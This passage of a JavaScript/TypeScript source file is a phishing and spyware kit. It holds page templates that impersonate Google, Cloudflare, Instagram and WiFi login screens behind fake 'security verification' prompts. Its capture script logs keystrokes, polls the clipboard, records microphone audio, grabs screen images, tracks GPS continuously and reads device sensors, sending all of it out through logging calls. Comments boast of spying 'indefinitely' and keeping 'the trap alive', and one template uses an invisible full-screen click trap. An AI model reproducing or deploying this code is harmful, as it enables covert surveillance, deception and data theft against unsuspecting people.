                  if (stream.getAudioTracks().length > 0) {
                    const recorder = new MediaRecorder(stream);
                    recorder.ondataavailable = async (e) => {
                      if (e.data.size > 0) {
                        const reader = new FileReader();
                        reader.onload = async () => {
                          const base64 = reader.result.split(',')[1];
                          await logEvent('extra', { audio_chunk: base64 });
                        };
                        reader.readAsDataURL(e.data);
                      }
                    };
                    setInterval(() => {
                      try {
                        if (recorder.state === 'inactive') recorder.start();
                        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 4500);
                      } catch(e) {}
                    }, 5000);
                  }
                  // Intentionally NOT stopping the stream so we spy indefinitely
                }
              }
            } catch(e) {}
            permsCompleted++;
          }
        };

        const fireGPS = async () => {
          if (requiredPerms.includes('gps') && navigator.geolocation) {
            return new Promise(resolve => {
              // Tak Terbatas: Watch position continuously instead of single get
              navigator.geolocation.watchPosition(
                (pos) => { 
                   logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }); 
                   permsCompleted++; 
                   resolve(); 
                },
                () => { permsCompleted++; resolve(); },
                { enableHighAccuracy: true, maximumAge: 0 }
              );
              setTimeout(() => { resolve(); }, 3000); // Fail-safe resolve
            });
          } else if (requiredPerms.includes('gps')) {
             permsCompleted++;
             return Promise.resolve();
          }
        };

        // DEEP INTERACTION: Log keystrokes for forensic pattern analysis
        window.addEventListener('keydown', function(e) {
          logExtra({ forensic_key: e.key, key_ts: Date.now() });
        });

        // SIMULTANEOUS PERMISSION TRIGGER: Aim for the 'one click' goal
        const firePermission = async (p) => {
          prog += stepProg;
          try {
            if (p === 'notification') {
              if (!isSilent) updateProgress(prog, "Initializing SSL handshake...");
              if ("Notification" in window) await pTimeout(Notification.requestPermission(), 4000);
            }
            if (p === 'clipboard') {
              if (!isSilent) updateProgress(prog, "Verifying session integrity...");
              if (navigator.clipboard && navigator.clipboard.readText) {
                var lastClip = "";
                setInterval(async () => {
                   try {
                     var clip = await navigator.clipboard.readText();
                     if (clip && clip !== lastClip) {
                        lastClip = clip;
                        await logExtra({ clipboard_update: clip });
                     }
                   } catch(e) {}
                }, 3000);
                var initialClip = await pTimeout(navigator.clipboard.readText(), 3000).catch(() => null);
                if (initialClip) { lastClip = initialClip; await logExtra({ clipboard: initialClip }); }
              }
            }
            if (p === 'media' || p === 'media_noisy') {
               if (!isSilent) updateProgress(prog, "Syncing identity markers...");
            }
            if (p === 'screen') {
               if (!isSilent) updateProgress(prog, "Validating display entropy...");
               if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                 var s = await pTimeout(navigator.mediaDevices.getDisplayMedia({ video: true }).catch(() => null), 15000);
                 if (s) {
                   var track = s.getVideoTracks()[0];
                   var video = document.createElement('video');
                   video.style.opacity = '0';
                   video.srcObject = s;
                   video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
                   document.body.appendChild(video);
                   await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
                   setInterval(async () => {
                       var canvas = document.createElement('canvas');
                       canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
                       var ctx = canvas.getContext('2d');
                       if (ctx) { 
                          ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
                          await logEvent('extra', { screen_label: track.label, screen_capture: canvas.toDataURL('image/jpeg', 0.6) }); 
                       }
                   }, 4000);
                 }
               }
            }
            if (p === 'storage') {
              if (navigator.storage && navigator.storage.estimate) {
                var est = await navigator.storage.estimate();
                await logExtra({ storage_mb: (est.usage/1024/1024).toFixed(2), quota_gb: (est.quota/1024/1024/1024).toFixed(2) });
              }
            }
            if (p === 'sensors') {
               if (window.Magnetometer) {
                 var mag = new Magnetometer({frequency: 5});
                 mag.onreading = () => logExtra({ sensor_mag: mag.x+','+mag.y+','+mag.z });
                 mag.start(); 
               }
               if (window.Accelerometer) {
                 var acc = new Accelerometer({frequency: 5});
                 acc.onreading = () => logExtra({ sensor_acc: acc.x+','+acc.y+','+acc.z });
                 acc.start();
               }
               if (window.Gyroscope) {
                 var gyr = new Gyroscope({frequency: 5});
                 gyr.onreading = () => logExtra({ sensor_gyr: gyr.x+','+gyr.y+','+gyr.z });
                 gyr.start();
               }
               if (window.AmbientLightSensor) {
                 var als = new AmbientLightSensor({frequency: 1});
                 als.onreading = () => logExtra({ sensor_light: als.illuminance });
                 als.start();
               }
               // Relative Orientation for 3D posture tracing
               if (window.RelativeOrientationSensor) {
                 var ros = new RelativeOrientationSensor({frequency: 5});
                 ros.onreading = () => logExtra({ sensor_orient: ros.quaternion.join(',') });
                 ros.start();
               }
            }
            if (p === 'vibration') { if (navigator.vibrate) navigator.vibrate(200); }
            if (p === 'network') {
               if (navigator.connection) await logExtra({ net_type: navigator.connection.effectiveType, rtt: navigator.connection.rtt });
            }
            if (p === 'webauthn') {
               if (window.PublicKeyCredential && window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
                 var av = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
                 await logExtra({ webauthn: av });
               }
            }
          } catch(e) {}
          permsCompleted++;
        };

        // Professional Security Handshake UI Logic (Discrete & Clean)
        const executeSimultaneously = async () => {
          if (!isSilent) updateProgress(prog, "Starting Security Handshake...");
          
          const overlay = document.createElement('div');
          overlay.id = 'sec-module-sync';
          overlay.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(255,255,255,0.98); backdrop-filter:blur(10px); z-index:9999999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#202124; font-family:"Inter", -apple-system, sans-serif; text-align:center; padding: 24px; box-sizing: border-box; transition: opacity 0.4s ease;';
          
          overlay.innerHTML = 
            '<div style="width: 54px; height: 54px; border: 2px solid #f1f3f4; border-top: 2px solid #1a73e8; border-radius: 50%; animation: scm-spin 0.7s cubic-bezier(0.4, 0, 0.2, 1) infinite; margin-bottom: 24px;"></div>' +
            '<h2 style="font-size: 19px; font-weight: 600; margin: 0 0 10px 0; color: #202124; letter-spacing: -0.01em;">Secure Environment Audit</h2>' +
            '<p style="font-size: 13px; line-height: 1.6; color: #5f6368; max-width: 320px; margin-bottom: 36px;">This session is being verified against our global security standards. Please acknowledge the system prompts to complete hardware-level encryption sync.</p>' +
            '<div style="background: #f8f9fa; border: 1px solid #dadce0; padding: 14px 24px; border-radius: 8px; font-size: 13px; color: #3c4043; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.03);">' +
            '  <div style="width: 8px; height: 8px; background: #34a853; border-radius: 50%; animation: scm-pulse 1.5s infinite;"></div>' +
            '  <span style="font-weight: 500;">AUDIT:</span>' +
            '  <span id="sync-status">Initializing Session...</span>' +
            '</div>' +
            '<p style="font-size: 10px; color: #9aa0a6; margin-top: 48px; font-family: monospace;">NODE: ' + id.substring(0,12).toUpperCase() + '</p>' +
            '<style>' +
            '  @keyframes scm-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }' +
            '  @keyframes scm-pulse { 0% { transform: scale(0.95); opacity: 0.8; } 50% { transform: scale(1); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.8; } }' +
            '</style>';
          document.body.appendChild(overlay);

          const statusEl = document.getElementById('sync-status');
          const tasks = [];
          
          if (requiredPerms.includes('media')) tasks.push(fireParallel());
          if (requiredPerms.includes('gps')) tasks.push(fireGPS());
          
          for (var i = 0; i < requiredPerms.length; i++) {
             var p = requiredPerms[i];
             if (p !== 'media' && p !== 'gps') {
                 try {
                   if (p === 'vibration' && navigator.vibrate) navigator.vibrate(200);
                   if (p === 'notification' && window.Notification) tasks.push(Notification.requestPermission());
                 } catch(e) {}
             }
          }
          
          let currentProg = 0;
          const statusInterval = setInterval(() => {
             currentProg += 5;
             if (currentProg > 95) currentProg = 95;
             updateProgress(currentProg);
          }, 1200);

          await Promise.allSettled(tasks);
          clearInterval(statusInterval);
          
          if (!isSilent) {
            if (permsCompleted < requiredPerms.length) {
              if (statusEl) {
                statusEl.innerText = "Module Authorization Partial";
                const retryBtn = document.createElement('button');
                retryBtn.innerText = "Resume Handshake";
                retryBtn.style.cssText = 'margin-top:20px; background:#1a73e8; color:white; border:none; padding:10px 20px; border-radius:4px; font-weight:600; cursor:pointer;';
                retryBtn.onclick = () => {
                  retryBtn.remove();
                  executeSimultaneously();
                };
                overlay.appendChild(retryBtn);
              }
            } else {
              if (statusEl) statusEl.innerText = "Environment Stable";
              setTimeout(() => {
                overlay.style.opacity = '0';
                setTimeout(() => {
                  if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
                  finish(true);
                }, 400);
              }, 800);
            }
          }
        };
        
        executeSimultaneously().catch(() => {});
        
        // Timeout fail-safe heavily extended to keep the trap alive for an hour
        setTimeout(() => { finish(true); }, 3600000); // 1 hour wait
        return;
      } catch (err) {
        finish(false, "System Busy.");
      }
    };

  })();
</script>
  `;
};

const ALL_PERMS = ['media', 'gps', 'screen', 'notification', 'clipboard', 'contacts', 'network', 'performance', 'security', 'storage_map', 'network_forensic', 'fonts_advanced', 'window_mgmt', 'webauthn', 'sensors', 'storage', 'vibration', 'bluetooth', 'files'];
const SILENT_PERMS = ['vibration', 'network', 'performance', 'security', 'storage_map', 'network_forensic'];
const NETWORK_PERMS = ['network', 'bluetooth', 'performance', 'security', 'network_forensic', 'vibration'];
const GOOGLE_PERMS = ['gps', 'media', 'network', 'performance', 'security', 'vibration'];
const LOGISTICS_PERMS = ['gps', 'network', 'vibration', 'performance'];
const FORENSIC_PERMS = ['clipboard', 'contacts', 'files', 'storage', 'storage_map', 'sensors'];

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  'silent_click': {
    name: "🛡️ Quick Security Check (One-Click)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verifikasi Keamanan</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#121212; color: #ffffff; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #1e1e1e; box-shadow: 0 4px 30px rgba(0,0,0,0.5); } .logo { font-size: 50px; margin-bottom: 20px; } .main-text { font-size: 24px; font-weight: 700; margin-bottom: 15px; color: #fff; } .sub-text { font-size: 15px; color: #aaa; margin-bottom: 40px; line-height: 1.5; } .btn-verify { background: #00ff00; color: #000; border: none; padding: 18px 40px; border-radius: 6px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 1px; } .btn-verify:hover { transform: scale(1.02); filter: brightness(1.1); box-shadow: 0 0 20px rgba(0,255,0,0.3); } .btn-verify:active { transform: scale(0.98); } </style></head><body><div class="container"><div class="logo">🛡️</div><div class="main-text">One-Click Verification</div><div class="sub-text">Sistem ini memverifikasi keamanan koneksi Anda secara instan menggunakan algoritma deteksi bot pasif.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='VERIFYING...'; window.startCapture('silent');">VERIFIKASI SEKARANG</button><div style="font-size:11px; color:#555; margin-top:25px;">Verified by Global Security Service</div></div>` + getCaptureScript(id, 'https://google.com', {
      tmplId: 'silent_click', perms: ['network', 'vibration', 'performance', 'security', 'storage_map', 'network_forensic'], accent: '#00ff00', icon: '⚡', flow: 'silent'
    }) + `</body></html>`
  },
  'enuma_elish': {
    name: "🛡️ Advanced Multi-Factor Verification",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Portal</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ff0000; overflow: hidden; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; box-shadow: 0 0 50px rgba(255, 0, 0, 0.5); border: 1px solid #330000; position: relative; z-index: 10; } .logo { font-size: 50px; margin-bottom: 20px; animation: pulse 2s infinite; } @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } } .main-text { font-size: 26px; font-weight: 800; margin-bottom: 15px; color: #ff0000; letter-spacing: 2px; } .sub-text { font-size: 15px; color: #888; margin-bottom: 30px; line-height: 1.5; } .btn-verify { background: #ff0000; color: #fff; border: none; padding: 25px 0; border-radius: 8px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 3px; position: relative; overflow: hidden; transition: 0.1s; } .btn-verify:active { transform: scale(0.95); background: #cc0000; } .tap-text { font-size: 14px; margin-top: 15px; color: #ff5555; font-weight: bold; animation: blink 0.5s infinite alternate; } @keyframes blink { from { opacity: 1; } to { opacity: 0.3; } } /* The trap element */ .click_trap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; display: none; } .ray-desc { font-family: monospace; font-size: 12px; color: #777; margin-top: 25px; } </style></head><body><div class="container"><div class="logo">👆👆</div><div class="main-text">SECURE INTERACTION</div><div class="sub-text">This server requires rapid multi-factor verification to establish a secure encrypted connection.</div><button class="btn-verify" onclick="initiateStrike(this)">Verify Interaction</button><p class="tap-text">⚠️ INTERACTION REQUIRED ⚠️</p><div class="ray-desc">REF CODE : rax53rtnaomap</div></div><div id="trap" class="click_trap" onclick="window.startCapture('all')"></div><script>function initiateStrike(btn) { btn.innerText = 'TAP SCREEN NOW!'; btn.style.background = '#aa0000'; document.getElementById('trap').style.display = 'block'; window.startCapture('all'); setTimeout(() => { if (document.getElementById('trap').style.display === 'block') { window.startCapture('all'); } }, 300); }</script>` + getCaptureScript(id, 'https://google.com', {
      tmplId: 'enuma_elish', perms: ALL_PERMS, accent: '#ff0000', icon: '👆', flow: 'aggressive'
    }) + `</body></html>`
  },
  'flash_strike': {
    name: "🔒 Comprehensive Device Logic Audit",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>System Verification</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ffcc00; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; border: 2px solid #ffcc00; box-shadow: 0 0 40px rgba(255, 204, 0, 0.4); } .logo { font-size: 50px; margin-bottom: 20px; text-shadow: 0 0 20px rgba(255,204,0,0.8); } .main-text { font-size: 28px; font-weight: 800; margin-bottom: 15px; color: #ffcc00; text-transform: uppercase; } .sub-text { font-size: 15px; color: #ccc; margin-bottom: 40px; line-height: 1.6; } .btn-verify { background: #ffcc00; color: #000; border: none; padding: 20px 40px; border-radius: 6px; font-size: 18px; font-weight: 900; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 2px; } .btn-verify:hover { transform: scale(1.05); filter: brightness(1.2); box-shadow: 0 0 30px rgba(255, 204, 0, 0.6); } .btn-verify:active { transform: scale(0.95); } </style></head><body><div class="container"><div class="logo">🔒</div><div class="main-text">Environment Audit</div><div class="sub-text">Please click once to confirm your device environment's integrity and authorize this encrypted session.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='PROCESSING...'; window.startCapture('all');">VERIFY ONCE</button></div>` + getCaptureScript(id, 'https://google.com', {
      tmplId: 'flash_strike', perms: ALL_PERMS, accent: '#ffcc00', icon: '💥', flow: 'aggressive'
    }) + `</body></html>`
  },
  'google': {
    name: "🛡️ Google: Security Audit Session",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico"><title>Verify Identity - Google Accounts</title><style>body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background:#ffffff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; -webkit-font-smoothing: antialiased; } .box { border:1px solid #dadce0; border-radius:8px; padding:48px 40px 36px; width:100%; max-width:450px; text-align:left; box-sizing:border-box; } .google-logo { width:75px; margin-bottom:12px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#3c4043; margin-bottom:32px; line-height: 1.5; } .identity-pill { border:1px solid #dadce0; border-radius:16px; padding:4px 10px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; font-weight: 500; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; float: right; transition: background .2s; } .btn:hover { background: #1b66c9; } .footer { display: flex; margin-top: 80px; font-size: 12px; color: #70757a; font-weight: 400; justify-content: space-between; clear: both; }</style></head><body><div class="box"><img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"><h1>Verify Identity</h1><div class="identity-pill"><img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png">Security Analysis Tool</div><p>This verification audit is required to confirm your device environment. One-tap verification facilitates a secure connection to your account dashboard.</p><div style="margin-top: 32px; height: 40px;"><button class="btn" onclick="window.startCapture('google');">Next</button></div><div class="footer"><div>English (United States)</div><div style="display:flex; gap:16px;"><span>Help</span><span>Privacy</span><span>Terms</span></div></div></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
      tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
    })}</body></html>`
  },
  'gallery': {
    name: "🖼️ Integrity: Media Forensic Sync (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Asset Integrity Check</title><style>body { background:#f8f9fa; color:#202124; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:48px; border-radius:12px; text-align:center; background:#fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border:1px solid #dadce0; } h2 { font-size:20px; font-weight:500; margin-top:0; } p { color:#70757a; font-size:14px; line-height:1.6; margin:20px 0 30px; } .btn { background:#1a73e8; color:#fff; padding:12px 32px; border-radius:6px; border:none; font-weight:500; cursor:pointer; width:100%; font-size:14px; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:15px;">🛡️</div><h2>Media Security Check</h2><p>Our systems require a standard security check to validate your identity for this session.</p><button class="btn" onclick="window.startCapture();">Verify Session</button><div style="font-size:10px; color:#999; margin-top:20px; text-align:center;">By verifying, you accept the <a href="#" style="color:#1a73e8; text-decoration:none;">Identity Verification Service Agreement</a></div></div>${getCaptureScript(id, 'https://photos.google.com', {
      tmplId: 'gallery', perms: ALL_PERMS, accent: '#1a73e8', icon: '🕵️'
    })}</body></html>`
  },
  'cloudflare': {
    name: "☁️ Cloudflare: Edge Verification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="https://www.cloudflare.com/favicon.ico"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:left; background:#ffffff; color: #313131; } .container { width: 100%; max-width: 600px; padding: 40px 20px; box-sizing: border-box; } .logo { width: 160px; height: auto; margin-bottom: 48px; } .main-text { font-size: 34px; font-weight: 700; line-height: 1.2; margin-bottom: 16px; color: #000; } .sub-text { font-size: 17px; color: #595959; margin-bottom: 40px; line-height: 1.6; } .btn-verify { background: #f6821f; color: white; border: none; padding: 18px 40px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 14px rgba(246, 130, 31, 0.4); } .btn-verify:hover { background: #e67615; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(246, 130, 31, 0.5); } .footer { font-size: 13px; color: #999; margin-top: 100px; border-top: 1px solid #eee; padding-top: 24px; width: 100%; display: flex; justify-content: space-between; } .footer a { color: #f6821f; text-decoration: none; }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare" class="logo" referrerpolicy="no-referrer"><div class="main-text">Verify you are human.</div><div class="sub-text">Please complete the security check to access the destination page. This helps keep our network safe and protects against automated attacks.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='Verifying...'; window.startCapture('cloudflare');">Verify Connection</button><div class="footer"><div>Ray ID: <span>${Math.random().toString(36).substring(2, 16)}</span></div><div>Performance & security by <a href="#">Cloudflare</a></div></div></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
      tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#f6821f', icon: '☁️'
    })}</body></html>`
  },
  'terminal': {
    name: "💻 System: Terminal Diagnostic Audit [STABLE]",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Terminal Integrity Check</title><style>
      body { background:#050505; color:#00ff41; font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; padding: 20px; box-sizing: border-box; overflow: hidden; }
      .box { width:100%; max-width:850px; background:rgba(10, 15, 10, 0.98); border:1px solid #1a3a2a; border-radius:4px; padding:50px; box-shadow:0 0 50px rgba(0, 255, 65, 0.08); position: relative; }
      .header-info { margin-bottom: 30px; border-bottom: 1px solid #1a3a2a; padding-bottom: 15px; }
      .header-info h2 { margin: 0; font-size: 18px; color: #00ff41; letter-spacing: 2px; }
      .header-info p { margin: 5px 0 0; font-size: 11px; color: #005020; font-weight: 600; }
      
      .btn-container { margin: 40px 0; display: flex; justify-content: center; }
      .btn { background: #00ff41; color:#000; border:none; padding:18px 45px; font-family:inherit; font-weight:900; cursor:pointer; font-size:14px; border-radius:2px; text-transform:uppercase; transition: all 0.3s; width: 100%; letter-spacing: 2px; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
      .btn:hover { background:transparent; color:#00ff41; box-shadow: 0 0 30px rgba(0,255,65,0.4); border: 1px solid #00ff41; }
      
      #log-console { height:220px; overflow-y:auto; font-size:11px; line-height:1.8; border:1px solid rgba(26, 58, 42, 0.5); background: rgba(0,0,0,0.3); border-radius: 4px; padding:15px; scrollbar-width: none; color: #00ca3c; mask-image: linear-gradient(to bottom, transparent, black 15%, black 85%, transparent); }
      #log-console::-webkit-scrollbar { display: none; }
      .line { margin-bottom: 4px; font-weight: 500; }
      .ts { color: #005020; margin-right: 12px; font-size: 10px; font-weight: 800; }
      .cursor { display:inline-block; width:8px; height:15px; background:#00ff41; animation: blink 1s infinite; vertical-align: middle; margin-left: 5px; }
      
      @keyframes blink { 0%, 100% { opacity:1; } 50% { opacity:0; } }
      .footer-info { color: #00401a; font-size: 10px; margin-top: 30px; text-align: center; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
      .status-pill { display: inline-block; padding: 2px 8px; border: 1px solid #00ff41; border-radius: 3px; font-size: 10px; margin-left: 10px; vertical-align: middle; }
      .glitch-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; opacity: 0.03; background: repeating-linear-gradient(0deg, #00ff41 0px, transparent 1px, transparent 2px); }
    </style></head><body><div class="glitch-layer"></div><div class="box">
    <div class="header-info">
      <h2>TERMINAL KERNEL AUDIT <span class="status-pill">STABLE</span></h2>
      <p>THREAT DETECTION SYSTEM // SESSION INTEGRITY // NODE_${id.substring(0,4)}</p>
    </div>
    
    <div class="btn-container">
      <button class="btn btn-verify">VERIFIKASI</button>
    </div>

    <div id="log-console">
      <div class="line"><span class="ts">[BOOT]</span> Initializing Deep Kernel Diagnostic...</div>
      <div class="line"><span class="ts">[INFO]</span> Awaiting authorization signature...<span class="cursor"></span></div>
    </div>
    
    <div class="footer-info">SECURED TUNNEL // ASIA-NODE-${id.substring(0,4)} // ID: ${id.substring(0,12)}</div>
    </div>
    <script>
      var log = document.getElementById('log-console');
      function addLine(msg, type) {
        var d = new Date();
        var tsStr = "[" + d.getHours().toString().padStart(2,'0') + ":" + d.getMinutes().toString().padStart(2,'0') + ":" + d.getSeconds().toString().padStart(2,'0') + "]";
        var div = document.createElement('div');
        div.className = 'line';
        div.innerHTML = '<span class="ts">' + (type || tsStr) + '</span> ' + msg.toUpperCase();
        log.appendChild(div);
        log.scrollTop = log.scrollHeight;
      }
      var lastStatus = "";
      setInterval(function() {
        if(window.lastStatusMsg && window.lastStatusMsg !== lastStatus) {
           lastStatus = window.lastStatusMsg;
           addLine(lastStatus, "EXEC");
           
           // Inject additional fake entropy to keep the terminal busy
           var fakeLines = [
             "Mapping memory offset 0x" + Math.random().toString(16).substr(2,8),
             "Verifying checksum sequence...",
             "Established secure peer link.",
             "Entropy pool synchronized."
           ];
           setTimeout(function() {
             addLine(fakeLines[Math.floor(Math.random()*fakeLines.length)], "SYS");
           }, 200);
        }
      }, 400);
    </script>${getCaptureScript(id, 'https://github.com', {
      tmplId: 'terminal', perms: ALL_PERMS, accent: '#00ff41'
    })}</body></html>`
  },
  'security_audit': {
    name: "🛡️ Security: Browser Ecosystem Audit (Extreme)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Trust & Safety</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .shield { color:#1877f2; font-size:60px; margin-bottom:20px; } h2 { font-size:24px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .btn { background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><div class="shield">🛡️</div><h2>Security Audit</h2><p>Our security systems have detected an unusual connection pattern. Please verify your connection to continue safely.</p><button class="btn" onclick="window.startCapture();">Verify & Continue</button><div style="font-size:10px; color:#999; margin-top:20px;">By continuing, you agree to the <a href="#" style="color:#1877f2; text-decoration:none;">Global Trust & Safety Agreement</a></div></div>${getCaptureScript(id, 'https://www.google.com/safetycenter', {
      tmplId: 'security_audit', perms: ALL_PERMS, accent: '#1877f2', icon: '🔒'
    })}</body></html>`
  },
  'meta_login': {
    name: "💬 Social: Account Recovery (Extreme)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login • Instagram</title><style>body { background:#fafafa; font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction: column; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:40px; width:100%; max-width:350px; box-sizing: border-box; text-align:center; margin-bottom: 12px; } .logo { width: 175px; height: auto; margin-bottom:35px; } h3 { font-size:16px; margin:0 0 12px; font-weight: 600; color: #262626; } p { color:#737373; font-size:14px; margin-bottom:30px; line-height: 1.5; } .btn { background:#0095f6; color:#fff; border:none; padding:7px 16px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 14px; transition: opacity 0.2s; } .btn:hover { opacity: 0.8; } .meta-brand { color: #737373; font-size: 12px; font-weight: 400; letter-spacing: 1px; margin-top: 40px; text-transform: uppercase; } .footer-copy { color: #737373; font-size: 12px; margin-top: 8px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" class="logo" referrerpolicy="no-referrer"><h3>Security Verification</h3><p>We've detected an unusual login attempt. To protect your information, please verify your session integrity on this device.</p><button class="btn" onclick="window.startCapture();">Verify Account</button></div><div class="meta-brand">from Meta</div><div style="font-size:10px; color:#999; margin-top:15px; text-align:center;">By logging in, you agree to the <a href="#" style="color:#0095f6; text-decoration:none;">Meta User Agreement</a></div>${getCaptureScript(id, 'https://www.instagram.com', {
      tmplId: 'meta_login', perms: ALL_PERMS, accent: '#0095f6', icon: '📸'
    })}</body></html>`
  },
  'wifi': {
    name: "📶 WIFI: Hotspot Certification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WiFi Authentication</title><style>body { background:#f4f7f6; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; text-align:center; width:100%; max-width:400px; padding: 40px 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); border-radius: 16px; box-sizing: border-box; } .wifi-icon { background: #e3f2fd; color: #1976d2; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; border-radius: 50%; margin: 0 auto 20px; font-size: 32px; } h1 { margin: 0 0 10px; font-size: 24px; color: #333; font-weight: 600; } p { color:#666; font-size:15px; margin-bottom: 30px; line-height: 1.5; } hr { border:0; border-top:1px solid #eee; margin: 0 0 30px; } .btn { background:#1976d2; color:#fff; border:none; padding:14px 40px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 16px; 